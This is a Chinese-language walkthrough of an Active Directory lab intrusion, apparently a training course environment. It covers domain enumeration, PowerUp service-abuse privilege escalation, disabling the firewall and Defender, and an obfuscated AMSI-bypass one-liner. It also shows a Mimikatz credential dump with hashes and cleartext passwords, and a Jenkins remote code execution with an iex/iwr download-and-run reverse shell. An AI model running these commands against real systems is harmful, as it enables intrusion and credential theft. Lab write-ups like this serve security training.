目标是在所有计算机内执行命令（不包括学生机器）

# 基本域信息枚举
当前域：
```
PS C:\ad> Get-NetDomain


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local
```


当前森林内所有域
```

PS C:\ad> Get-NetForestDomain -Forest  moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local
```

父域：moneycorp.local
父域DC：mcorp-dc.moneycorp.local

当前域：dollarcorp.moneycorp.local
当前域DC:dcorp-dc.dollarcorp.moneycorp.local

子域：us.dollarcorp.moneycorp.local


枚举当前域所有计算机列表
```
PS C:\ad> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
<省略学生机器>
```

当前域所有用户
```
PS C:\ad> Get-NetUser|select cn

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
<省略学生机器>
```

枚举域中所有用户组
```

PS C:\ad> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```

枚举所有域管理员信息
```
PS C:\ad> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

一共两个域管理员，这两个要重点关注。
```
svcadmin
Administrator
```

# 本地权限提升

引入powerup，全面检查漏洞情况
```
PS C:\ad> . .\PowerUp.ps1
PS C:\ad> Invoke-AllChecks
```

发现有两个可以修改的服务
```
[*] Checking service permissions...


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
```

选择SNMPTRAP进行权限提升
```
PS C:\ad> Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName 'dcorp\student366'
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...

ServiceAbused Command
------------- -------
SNMPTRAP      net localgroup Administrators dcorp\student366 /add

```

然后以管理员身份打开一个powershell的新窗口，输入当前学生账号和密码，如果能打开，说明提权成功
```
PS C:\ad> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes

========================================== ================ ============================================= ==============
=================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory grou
p, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory grou
p, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory grou
p, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory grou
p, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory grou
p, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

可以看到我们已经在本地Administrators组

# 关闭防火墙和windefend

查看当前防火墙状态
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

关闭防火墙
```
PS C:\ad> NetSh Advfirewall set allprofiles state off
Ok.
```

再次查看防火墙状态,已成功关闭
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

查看WinDefend状态，显示Running
```
PS C:\ad> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Service
```

以管理员身份运行下面powershll命令：
```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```

重启计算机
```
Restart-Computer
```

如果显示还是没有关掉，那就手动去关一下。。

# bloodhold

部署过程参考walkthrough1

参考bloodhold收集的结果，最快到达DA的路径是：
当前用户（student366）在RDPUsers组，可以以本地管理员的身份横向到计算机dcorp-adminsrv

dcorp-adminsrv和域控服务器dcorp-dc存在某种约束条件（Delegate）,可以加以利用

域控服务器dcorp-dc有域管理员的登录session

# 域权限提升
查看可以以本地管理员登录的计算机
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```

横向到dcorp-adminsrv
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

可以bypass powershell policy，但是不能bypass AMSI，会报错
```
[dcorp-adminsrv]: PS C:\Users\student366\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]
( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}
" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0
}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."s
E`T`VaLUE"( ${n`ULl},${t`RuE} )
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:96
+ ... ,'rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly" ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```

枚举所有AppLocker策略
```
[dcorp-adminsrv]: PS C:\Users\student366\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollecti
ons


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

留意最后两条，所以脚本只可以在```{%PROGRAMFILES%\*}```和```{%WINDIR%\*}```下执行

把脚本拷贝到 \\dcorp-adminsrv\Program Files
```
 PS C:\ad> copy Invoke-Mimikatz.ps1 \\dcorp-adminsrv\c$\"Program Files"
PS C:\ad> ls \\dcorp-adminsrv\c$\"Program Files"


    Directory: \\dcorp-adminsrv\c$\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                Common Files
d-----        7/16/2016   6:18 AM                internet explorer
d-----        8/20/2020   3:48 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WindowsPowerShell
-a----        5/18/2021   6:59 PM        2530060 Invoke-Mimikatz.ps1
```

然而还是不能引入Mimikatz，会报错
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> . .\Invoke-Mimikatz.ps1
C:\Program Files\Invoke-Mimikatz.ps1 : Cannot dot-source this command because it was defined in a different language mode. To invoke this command without importing its contents, omit the '.' operator.
At line:1 char:1
+ . .\Invoke-Mimikatz.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Invoke-Mimikatz.ps1], NotSupportedException
    + FullyQualifiedErrorId : DotSourceNotSupported,Invoke-Mimikatz.ps1
```

这里是因为开启了Constrained Language Mode，CLM，就算能把脚本拷贝到靶机，我们也不能执行。

在dcorp-adminsrv关闭Windows Defender
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```

## script调用自己

方法：
1. 复制一份Invoke-Mimikatz.ps1，取名为：Invoke-Mimikatz2.ps1
2. 在Invoke-Mimikatz2.ps1文件的最底部，加一行命令：Invoke-Mimikatz  #其实就是调用自己


把修改好的脚本拷贝到dcorp-adminsrv，注意根据上面的Applocker策略，只可以放在Program Files文件夹
```
Copy-Item .\Invoke-Mimikatz2.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

回到dcorp-adminsrv，不要把Invoke-Mimikatz2.ps1引入内存，而是直接执行，因为上面在拷贝那里加了一行Invoke-Mimikatz，所以会导出所有哈希

```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-Mimikatz2.ps1

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 166214 (00000000:00028946)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:43:30 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 67126 (00000000:00010636)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21719 (00000000:000054d7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 66422 (00000000:00010376)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1113
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```

收集到的哈希信息：
```
srvadmin：a98e18228819e8eec3dfa33cb68b0728
appadmin：d549831a955fee51a43c83efb3928fa7
dcorp-adminsrv$：5e77978a734e3a7f3895fb0fdbda3b96
websvc：cc098f204c5887eaa8253e7c2749156f
```
这里注意srvadmin不是DA组成员

DA成员应该是svcadmin

查看当前权限账号可以以本地管理员登录的计算机
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-mgmt
```

这次多了一个dcorp-mgmt

尝试在dcorp-mgmt中执行命令
```
PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
dcorp\srvadmin
dcorp-mgmt
```


# jenkins!

在```http://172.16.3.11:8080/```运行了一个jenkins!程序

jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople/```

收集到三个用户名
```
builduser
jenkinsadmin
manager
```

经手工测试```builduser：builduser```登录进去以后可以编辑一个RCE

payload
```
powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443
```

powercat监听
```
PS C:\ad> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.3.11] port  [tcp] accepted (source port 50288)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>PS C:\Program Files (x86)\Jenkins\workspace\project1> whoami
dcorp\ciadmin
PS C:\Program Files (x86)\Jenkins\workspace\project1> hostname
dcorp-ci
```

收到一个反弹shell

bypass powershell和AMSI

远程加载Invoke-Mimikatz，导出哈希
ex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)

iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)